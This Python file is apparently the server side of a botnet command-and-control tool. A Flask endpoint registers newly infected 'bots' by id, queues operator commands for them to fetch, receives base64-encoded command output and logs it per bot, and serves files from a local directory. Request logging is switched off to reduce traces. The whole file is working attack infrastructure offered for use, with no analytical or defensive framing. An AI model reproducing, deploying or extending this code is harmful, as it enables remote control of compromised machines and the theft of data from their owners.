from shell import App
from flask import Flask, flash, request, redirect, url_for, Response, app
from bots import setup, Bot
from flask_autoindex import AutoIndex
import threading
import os
import logging
import datetime
import codecs
import base64

# cmd shell
shell = App()

# server
app = Flask(__name__)
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# directory listing - serving files
AutoIndex(app, './dir')

# TODO upload function

# Route to get id , sendCommand and get result
# parameter id (bot.id - bot name and folder)
# parameter res (bot.response)
@app.route('/cmd')
def getId():
    path = './bots/'
    id = request.args.get('id')
    bot = setup.devices.get(str(id))

    if not bot:
        os.makedirs(path+id)
        setup.devices.update({id:Bot(True, '<p></p>')})
        shell.async_alert('\033[94m' + 'New bot: '+ id + '\033[0m')
        return Response("<p></p>", mimetype='text/plain')
    if request.args.get('r'):
        bot.response += request.args.get('r')
        return Response(bot.response, mimetype='text/plain')
    if not request.args.get('r') and bot.response != '':
        f = open(path + request.args.get('id') + "/log.txt","a+")
        date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(date + ' raw result >> ' + bot.response + '\n')
        try:
            result = bot.response.decode('base64', 'strict')
            f.write(date + ' decoded result >> ' + result + '\n')
        except:
            pass
        bot.response = '<p></p>'

    command = bot.command
    bot.online = True
    bot.command = '<p></p>'
    setup.devices.update({id:bot})
    return Response(command, mimetype='text/plain')

def flaskThread():
    app.run()


if __name__ == '__main__':
    threading.Thread(target=flaskThread).start()
    shell.cmdloop()
